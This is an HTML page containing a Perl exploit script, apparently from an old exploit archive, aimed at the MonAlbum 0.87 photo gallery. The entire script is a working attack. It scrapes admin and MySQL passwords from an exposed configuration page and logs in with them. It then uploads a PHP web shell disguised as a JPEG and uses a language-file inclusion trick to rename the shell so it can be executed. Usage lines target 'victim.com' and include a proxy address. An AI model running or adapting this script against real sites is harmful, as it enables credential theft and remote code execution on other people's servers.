<html><head><title>MonAlbum 0.87 Upload Shell / Password Grabber Exploit</title></head><pre>#!/usr/bin/env perl
use strict; use warnings;
###############################################
use LWP::UserAgent;
use HTTP::Request::Common;
use Getopt::Std;

my (%args, $user, $password, $sql_host, $sql_user, $sql_password, $cookie, $path, $file, $upload)  = ();
my $tmp = 'cmd1.jpg';

getopts(&quot;u:a:f:p:&quot;, \%args);
#######################################################################
# -a don't retrieve login and passwords, use from command line instead#
# -u vuln url                                                         #
# -f local php-shell                                                  #
# -p http proxy                                                       #
#######################################################################

if(!$args{u}) { &amp;usage(); exit(0);}

if(defined $args{a}){
	($user,$password) = split(':',$args{a});
}

if(!$args{a}){
	my $ua= new LWP::UserAgent;
	$ua-&gt;agent(&quot;Mozilla/5.0&quot;);
	if(defined $args{p}){$ua-&gt;proxy('http', &quot;http://$args{p}&quot;);}
	$ua-&gt;max_redirect(0);
	$args{u} =~ s%/$%%i;
	my $request = new HTTP::Request( 'GET' =&gt; &quot;$args{u}&quot;.&quot;/admin/admin_configuration.php&quot;);
	my $document = $ua-&gt;request($request);
	my $response = $document-&gt;as_string;
	$response =~ m%&lt;input type=&quot;text&quot; name=&quot;gadm_user&quot; value=&quot;(.*?)&quot;&gt;%is;
	$user = $1;
	$response =~ m%&lt;input type=&quot;password&quot; name=&quot;gadm_pass&quot; value=&quot;(.*?)&quot;&gt;%is;
	$password = $1;
	$response =~ m%&lt;input type=&quot;text&quot; name=&quot;gcfgHote&quot; value=&quot;(.*?)&quot;&gt;%is;
	$sql_host = $1;
	$response =~ m%&lt;input type=&quot;text&quot; name=&quot;gcfgUser&quot; value=&quot;(.*?)&quot;&gt;%is;
	$sql_user = $1;
	$response =~ m%&lt;input type=&quot;password&quot; name=&quot;gcfgPass&quot; value=&quot;(.*?)&quot;&gt;%is;
	$sql_password = $1;
	print(&quot;########################################################################\n&quot;);
	if(defined $user &amp;&amp; defined $password){
		print &quot;#Admin Panel: $user\t$password                                         \n&quot;;
		print(&quot;########################################################################\n&quot;);
		print &quot;#Mysql Details: $sql_host\t$sql_user\t$sql_password                    \n&quot;;
	}else{
		print &quot;#Failed...                                                             #\n&quot;;
		exit(0);
	}
}

goto _EXIT_ unless defined $args{f};

my $ua= new LWP::UserAgent;
$ua-&gt;agent(&quot;Mozilla/5.0&quot;);
if(defined $args{p}){$ua-&gt;proxy('http', &quot;http://$args{p}&quot;);}
$args{u} =~ s%/$%%i;
my $request = HTTP::Request::Common::POST(
		&quot;$args{u}/admin/login_page.php&quot;,
		Content_Type =&gt; 'application/x-www-form-urlencoded',
		Referer =&gt; &quot;$args{u}/admin/login_page.php&quot;,
		Content =&gt; [
			login_adm =&gt; &quot;$user&quot;,
			pass_adm =&gt; &quot;$password&quot;,
			send =&gt; &quot;Enter&quot;
		]
	);
my $document = $ua-&gt;request($request);
my $response = $document-&gt;as_string;
if($response =~ m/document\.location\.replace\(\'\.\.\/admin\.php\'\)/i){
	print(&quot;########################################################################\n&quot;);
	print &quot;#Login successfull                                                     #\n&quot;;
	$response =~ m%Set-Cookie: (.*?);%is;
	$cookie = $1;
}else{
	print(&quot;########################################################################\n&quot;);
	print &quot;#Login failed                                                          #\n&quot;;
	goto _EXIT_;
}

$ua-&gt;default_headers-&gt;push_header('Cookie' =&gt; &quot;$cookie&quot;);
$request = new HTTP::Request( 'GET' =&gt; &quot;$args{u}&quot;.&quot;/admin/admin_ajouter_img.php&quot;);
$document = $ua-&gt;request($request);
$response = $document-&gt;as_string;
$response =~ m%&lt;form ENCTYPE='multipart/form-data'  method='post' action=(.*?)&gt;%i;
$upload = $1;

$request = HTTP::Request::Common::POST(
	&quot;$args{u}/admin/$upload&quot;,
	Content_Type =&gt; 'multipart/form-data',
	Referer =&gt; &quot;$args{u}/admin/admin_ajouter_img.php&quot;,
	Content =&gt; [
		MAX_FILE_SIZE =&gt; &quot;1000000&quot;,
		userfile =&gt; [$args{f}],
		Content_Type =&gt; &quot;image/jpeg&quot;
	]
);

$document = $ua-&gt;request($request);
$response = $document-&gt;as_string;
#print $response;

$response =~ m%is not a valid JPEG file in &lt;b&gt;(.*?)&lt;\/b&gt;%i;
#/var/www/web70/html/monalbum/admin/admin_ajouter_img.php
#print $1;
$path = $1;
$path =~ s%/admin/admin_ajouter_img\.php%%i;
$path .= &quot;/images&quot;;
#print $path;

$args{f} =~ m/([\w\.\-]+)$/i;
$file = $1;

open TEMP,&quot;&gt;$tmp&quot; || die &quot;Can't open $tmp: $!\n&quot;;
print TEMP &quot;&lt;?php system(\&quot;mv $path/$file $path/$file.php\&quot;); die(); ?&gt;&quot;;
close(TEMP);

$request = HTTP::Request::Common::POST(
	&quot;$args{u}/admin/$upload&quot;,
	Content_Type =&gt; 'multipart/form-data',
	Referer =&gt; &quot;$args{u}/admin/admin_ajouter_img.php&quot;,
	Content =&gt; [
		MAX_FILE_SIZE =&gt; &quot;1000000&quot;,
		userfile =&gt; [$tmp],
		Content_Type =&gt; &quot;image/jpeg&quot;
	]
);

$document = $ua-&gt;request($request);
$request = HTTP::Request::Common::POST(
	&quot;$args{u}/admin/admin_configuration.php&quot;,
	Content_Type =&gt; 'multipart/form-data',
	Referer =&gt; &quot;$args{u}/admin/admin_configuration.php&quot;,
	Content =&gt; [
		glangage =&gt; &quot;../images/$tmp&quot;,
		Save =&gt; &quot;Save&quot;
	]
);
$document = $ua-&gt;request($request);
$ua-&gt;max_redirect(0);
$request = new HTTP::Request( 'HEAD' =&gt; &quot;$args{u}/images/$file.php&quot;);
$document = $ua-&gt;request($request);


if($document-&gt;is_success){
	print(&quot;########################################################################\n&quot;);
	print &quot;#Shell Uploaded Successfull!                                           #\n&quot;;
	print &quot;#U may now try: $args{u}/images/$file.php                              \n&quot;;
}else{
	print(&quot;########################################################################\n&quot;);
	print &quot;#Something went wrong!!!                                               #\n&quot;;
	}

_EXIT_:
unlink($tmp);
print(&quot;########################################################################\n&quot;);
exit(0);

sub usage
{
print(&quot;###########################################################################
# -a using account from command line                                      #
# -u vuln url                                                             #
# -f local php-shell  (optional)                                          #
# -p http proxy       (optional)                                          #
###########################################################################
# : perl sp.pl -u http://victim.com/monalbum/ -p 75.34.123.215:9629       #
# : perl sp.pl -u http://victim.com/monalbum/ -f shell.jpg                #
# : perl sp.pl -u http://victim.com/monalbum/ -a admin:admin -f shell.jpg #
# this lame script was coded by v0l4arrra                                 #
###########################################################################
&quot;
);
}

# milw0rm.com [2007-12-10]</pre></html>